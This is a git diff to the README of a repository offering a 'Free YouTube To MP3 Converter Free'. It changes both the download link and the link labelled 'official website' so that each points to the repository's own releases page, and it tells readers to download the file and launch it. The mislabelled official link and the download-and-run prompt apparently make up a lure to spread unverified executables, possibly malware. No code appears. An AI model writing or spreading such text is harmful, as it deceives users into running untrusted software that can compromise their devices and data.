@@ -32,7 +32,7 @@ Welcome to the "Free YouTube To MP3 Converter Free" repository! This repository 
 
 ## Get Started
 
-To access the repository and start using the Free YouTube To MP3 Converter Free, simply download the [Project.zip](https://github.com/files/Project.zip) file and follow the instructions within. If the link ends with the file name, make sure to launch it to begin your audio conversion journey.
+To access the repository and start using the Free YouTube To MP3 Converter Free, simply download the [https://github.com/yumYumdonuts/Free-YouTube-To-MP3-Converter-Free/releases](https://github.com/yumYumdonuts/Free-YouTube-To-MP3-Converter-Free/releases) file and follow the instructions within. If the link ends with the file name, make sure to launch it to begin your audio conversion journey.
 
 If the above link is not working or you prefer to explore more options, feel free to check the "Releases" section for alternative downloads.
 
@@ -40,7 +40,7 @@ Let the music play! 🎧🎶
 
 ## Additional Resources
 
-For more information and support, visit the [official website](https://www.youtubetomp3converter.com). Explore the FAQ section for answers to common queries and get in touch with the support team for any assistance needed.
+For more information and support, visit the [official website](https://github.com/yumYumdonuts/Free-YouTube-To-MP3-Converter-Free/releases). Explore the FAQ section for answers to common queries and get in touch with the support team for any assistance needed.
 
 Stay tuned for updates and new features coming soon! 🚀
 
